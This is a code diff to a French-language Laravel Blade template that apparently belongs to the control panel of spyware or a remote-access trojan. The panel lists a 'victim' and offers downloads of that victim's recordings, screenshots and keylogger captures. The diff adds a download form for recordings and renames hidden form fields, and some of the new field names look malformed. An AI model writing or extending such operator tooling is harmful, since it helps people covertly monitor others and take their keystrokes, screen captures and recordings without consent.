@@ -153,7 +153,12 @@
                                                         <td>{{ $record->created_at->format('H:i') }}</td>
                                                         <td>{{ $record->created_at->format('d/m/Y') }}</td>
                                                         <td>
-                                                            <button type="button" class="btn btn-success">Télécharger</button>
+                                                            <form method="POST" action="/record/dl">
+                                                                @csrf
+                                                                <input type="hidden" name="record->id" value="{{ $record->id }}">
+                                                                <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
+                                                                <button type="submit" class="btn btn-success">Télécharger</button>
+                                                            </form>
                                                             <button type="button" class="btn btn-danger">Supprimer</button>
                                                         </td>
                                                     </tr>
@@ -259,7 +264,7 @@
                                                         <td>
                                                             <form method="POST" action="/screenshot/dl">
                                                                 @csrf
-                                                                <input type="hidden" name="picture_id" value="{{ $screenshot->id }}">
+                                                                <input type="hidden" name="$screenshot_id" value="{{ $screenshot->id }}">
                                                                 <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                                                 <button type="submit" class="btn btn-success">Télécharger</button>
                                                             </form>
@@ -372,7 +377,7 @@
                                                         <td>
                                                             <form method="POST" action="/keylogger/dl">
                                                                 @csrf
-                                                                <input type="hidden" name="picture_id" value="{{ $keylogger->id }}">
+                                                                <input type="hidden" name="keylogger_id" value="{{ $keylogger->id }}">
                                                                 <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                                                 <button type="submit" class="btn btn-success">Télécharger</button>
                                                             </form>
